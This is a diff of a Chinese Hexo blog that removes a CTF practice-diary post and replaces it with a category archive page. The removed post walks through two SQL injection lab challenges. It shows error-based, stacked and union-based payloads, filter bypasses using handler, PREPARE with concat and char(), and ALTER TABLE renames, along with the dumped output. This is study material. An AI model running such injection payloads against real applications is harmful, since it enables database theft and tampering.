@@ -9,7 +9,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            20240330刷题日记
+            分类 - ctf刷题日记
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -32,40 +32,15 @@
 <meta name="generator" content="Hexo 7.1.1"></head>
 <body>
     <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/post.css">
+    <link type="text/css" rel="stylesheet" href="/css/archive.css">
 <div id="header" class="header">
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-subtitle">20240330刷题日记</h1>
+                <h1 class="header-subtitle">分类归档</h1>
                 <div class="header-subinfo">
-                    <p class="article-info-text">
-                        <span>
-                            <i class="iconfont icon-time"></i> 发表时间：2024-03-30
-                        </span>
-                        
-                            
-                                <span id="/article/2623458554/" class="leancloud_visitors" data-flag-title="20240330刷题日记">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            
-                                <span>
-                                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/2623458554/"></span>
-                                </span>
-                              
-                        
-                    </p>
-                    
-                        
-                            <span class="category-color">ctf刷题日记</span>
-                        
-                    
-                    
-                        
-                            <span class="tag-color">ctf刷题日记</span>
-                        
-                    
+                    <p class="article-info-text Chinese"></p>
+                    <p class="article-info-text English"></p>                  
                 </div>
             
         </div>
@@ -74,148 +49,47 @@
 </div>
 <div id="container">
     
-        <!-- 文章页面 -->
-        <div id="article">
-            <div class="toc"></div>
-            <div class="article-body">
-                <h1 id="2024-3-30-主站刷题"><a href="#2024-3-30-主站刷题" class="headerlink" title="2024&#x2F;3&#x2F;30 主站刷题"></a>2024&#x2F;3&#x2F;30 主站刷题</h1><h2 id="1-ez-sql"><a href="#1-ez-sql" class="headerlink" title="1.ez_sql"></a>1.ez_sql</h2><p>1.测试注入类型<br>  回显 2-1不等于1，字符型</p>
-<p>2.判断闭合方式</p>
-<p>  1‘看报错，得知单引号闭合</p>
-<p>3.查列数</p>
-<p>group by得2列</p>
-<p>4.union select查询</p>
-<p>select被过滤，绕过方法也失效，采用报错注入</p>
-<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27%7C%7Cextractvalue(1,concat(%27$%27,(database())))%7C%7C%271%27=%271">http://210.30.97.133:28043/?inject=1&#39;||extractvalue(1,concat(&#39;$&#39;,(database())))||&#39;1&#39;=&#39;1</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1105 : Unknown XPATH variable at: &#x27;$supersqli&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>拿表名</p>
-<p>发现过滤了&#x3D;&#x3D;.&#x3D;&#x3D;号，还过滤了where，查资料发现可以堆叠注入</p>
-<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27;show">http://210.30.97.133:28043/?inject=1&#39;;show</a> databases;#</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;`</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27;show">http://210.30.97.133:28043/?inject=1&#39;;show</a> tables;#</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>select被过滤</p>
-<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27;show">http://210.30.97.133:28043/?inject=1&#39;;show</a> columns from words;# 没有flag</p>
-<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28085/?inject=1%27;show">http://210.30.97.133:28085/?inject=1&#39;;show</a> columns from `1919810931114514`;# &#x3D;&#x3D;反单引号括住&#x3D;&#x3D;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>?inject&#x3D;1’;select flag from flag;# 会过滤select，到这没思路去看<a href=https://blog.csdn.net/weixin_44632787/article/details/118737571>wp</a>了</p>
-<p>方法一：MySQL中查询语句handler：</p>
-<ol>
-<li><code>handler 【表名】 open;</code> &#x2F;&#x2F; 打开某个表</li>
-<li><code>handler 【表名】 read first || next;</code> &#x2F;&#x2F; 读取表里第一行或者下一行的数据</li>
-<li><code>handler 【表名】 close;</code> &#x2F;&#x2F; 关闭该表</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler `1919810931114514` open;</span><br><span class="line">handler `1919810931114514` read first;</span><br><span class="line">handler `1919810931114514` close;</span><br></pre></td></tr></table></figure>
-
-<p>方法二：</p>
-<ol>
-<li><code>PREPARE 【自定义名】 FROM 【自定义的SQL查询语句】;</code>&#x2F;&#x2F;生成</li>
-<li><code>EXECUTE 【自定义名】;//执行</code></li>
-<li><code>DEALLOCATE PREPARE 【自定义名】;</code>&#x2F;&#x2F;释放</li>
-</ol>
-<p>由于select被过滤，concat绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE Hack_SQL from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);</span><br><span class="line">EXECUTE Hack_SQL;</span><br><span class="line">DEALLOCATE PREPARE Hack_SQL;</span><br></pre></td></tr></table></figure>
-
-<p>或者ascii编码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE Hack_SQL from concat(char(115,101,108,101,99,116), &#x27; * from `1919810931114514`&#x27;);</span><br><span class="line">EXECUTE Hack_SQL;</span><br><span class="line">DEALLOCATE PREPARE Hack_SQL;#</span><br></pre></td></tr></table></figure>
-
-<p>方法三</p>
-<p>由于前端提供查询的数据库为words，但是flag在数据库1919810931114514里。并且可以猜测后台的SQL查询语句为：select * from words where id&#x3D;【你输入的id】</p>
-<p>1.所以我们需要先将数据库words改成其它的数据库名<br>2.再把数据库1919810931114514改名为words<br>3.并且把（改名前）1919810931114514数据库的字段flag改名成id</p>
-<p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter table words rename to words1;</span><br><span class="line">alter table `1919810931114514` rename to words;</span><br><span class="line">alter table words change flag id varchar(100);</span><br></pre></td></tr></table></figure>
-
-<p>改完之后输入?inject&#x3D;1’ or 1&#x3D;1;   显示flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(42) &quot;flag&#123;590b74d2-2d4d-41f7-bb0e-137622e5043b&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>参考文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44632787/article/details/118737571">https://blog.csdn.net/weixin_44632787/article/details/118737571</a></p>
-</blockquote>
-<h2 id="SSSCTF2023-YUAN’S-SQL"><a href="#SSSCTF2023-YUAN’S-SQL" class="headerlink" title="SSSCTF2023-YUAN’S SQL"></a>SSSCTF2023-YUAN’S SQL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM jiuzhe WHERE id = &quot;</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
-
-<p>提示：闭合方式是(id)</p>
-<p>发现注释符好像没有用，手动闭合</p>
-<p>&#x3D;&#x3D;?id&#x3D;1) or (1&#x3D;1&#x3D;&#x3D;  给了个fake flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; Array ( [id] =&gt; 3 [username] =&gt; A306 [password] =&gt; where_is_flag ) [1] =&gt; Array ( [id] =&gt; 4 [username] =&gt; Fake_F1ag [password] =&gt; sssctf&#123;f11lag_is_not_there_hahaha&#125; ) )</span><br></pre></td></tr></table></figure>
-
-<p>试了试id&#x3D;3，发现有回显，测试注入点</p>
-<p>&#x3D;&#x3D;?id&#x3D;3)–+&#x3D;&#x3D;  Array ( [0] &#x3D;&gt; Array ( [id] &#x3D;&gt; 3 [username] &#x3D;&gt; A306 [password] &#x3D;&gt; where_is_flag ) )</p>
-<p>?id&#x3D;3) group by 4–+无回显，3有回显，3列</p>
-<p>?id&#x3D;3) union select 1,2,database()–+Array ( [id] &#x3D;&gt; 1 [username] &#x3D;&gt; 2 [password] &#x3D;&gt; &#x3D;&#x3D;dutctf&#x3D;&#x3D; ) </p>
-<p>?id&#x3D;3) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’dutctf’–+</p>
-<p>查表</p>
-<p> Array ( [id] &#x3D;&gt; 1[username] &#x3D;&gt; 2 [password] &#x3D;&gt; &#x3D;&#x3D;jiuzhe,users&#x3D;&#x3D;) )</p>
-<p>查列</p>
-<p>?id&#x3D;3) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’dutctf’ and table_name&#x3D;’users’–+</p>
-<p>Array ( [id] &#x3D;&gt; 1 [username] &#x3D;&gt; 2 [password] &#x3D;&gt; id,&#x3D;&#x3D;username,password&#x3D;&#x3D; ) </p>
-<p>查数据</p>
-<p>?id&#x3D;3) union select 1,2,group_concat(username,password) from users–+</p>
-<p>Array ( [id] &#x3D;&gt; 1 [username] &#x3D;&gt; 2 [password] &#x3D;&gt; scr1wOHHHHHHH,Flag&#x3D;&#x3D;flag{c39ee9a1-5a6f-41c4-9789-909ab2d1ba1d}&#x3D;&#x3D; )</p>
-<p>学过了再来复现新生赛，很有成就感╰(￣▽￣)╭</p>
-
-                
-                <p class="end">__END__</p>
-            </div>
-            <div class="article-footer">
-                <div class="suffix-box">
-    <div class="suffix-box-left">
-        <img src="/image/sidebar/RL02.jpg" alt="Dyinglight">
-    </div>
-    <div class="suffix-box-right">
-        <span class="suffix-box-title">文章作者：</span>Dyinglight
-        <br>
-        <span class="suffix-box-title">文章出处：</span><a href="/article/2623458554/" target="_blank">20240330刷题日记</a>
-        <br>
-        <span class="suffix-box-title">作者签名：</span>原神,启动！
-        <br>
-        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
-        <br>
-        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
-        <br>
-    </div>
-    <div style="clear: both;"></div>
-</div>
-                
-                    <div class="category">
-                        分类：
+        
+            <!-- 归档页面、分类归档页面、标签归档页面 -->
+            <div class="articles">
+                <div class="articles-wrap">
+                    <span class="archive-move-on"></span>
+                    <span class="archive-counter">
                         
-                            <a href="/category/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/">ctf刷题日记</a>
+                            当前分类：<span class="category">ctf刷题日记</span>
                         
-                    </div>
-                
-                
-                    <div class="tag">
-                        标签：
-                        
-                            <a href="/tag/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/">ctf刷题日记</a>
-                        
-                    </div>
-                
-                <div class="article-prev-next">
-                    
-                        <a href="/article/2093147683/" class="prev-prefix">« </a> 上一篇：    <a href="/article/2093147683/" title="发布于 2024-03-31 11:51">20240331刷题日记-sql</a>
-                        <br>
+                    </span>
                     
                     
-                        <a href="/article/1009170077/" class="next-prefix">» </a> 下一篇：    <a href="/article/1009170077/" title="发布于 2024-03-24 09:01">DUTCTF2024 wp</a>
+                        
+                            <div class="archive-title">
+                                <h2 class="archive-year">2024</h2>
+                            </div>
+                            
+                           
+                        <div class="article">
+                            <div class="article-header">
+                                <h1 class="article-title"><a href="/article/2093147683/"><span>20240331刷题日记-sql</span></a></h1>
+                                <div class="article-meta">
+                                    <span class="article-time">03-31</span>
+                                </div>
+                            </div>
+                        </div>
+                    
+                           
+                        <div class="article">
+                            <div class="article-header">
+                                <h1 class="article-title"><a href="/article/2623458554/"><span>20240330刷题日记</span></a></h1>
+                                <div class="article-meta">
+                                    <span class="article-time">03-30</span>
+                                </div>
+                            </div>
+                        </div>
                     
                 </div>
             </div>
             
-    <div class="article-comments">
         
-            <div class="comments-title">
-                评论列表
-            </div>
-        
-        <div class="comments-content"></div>
-    </div>
-    
- 
-        </div>
     
 </div>
     <div id="footer">
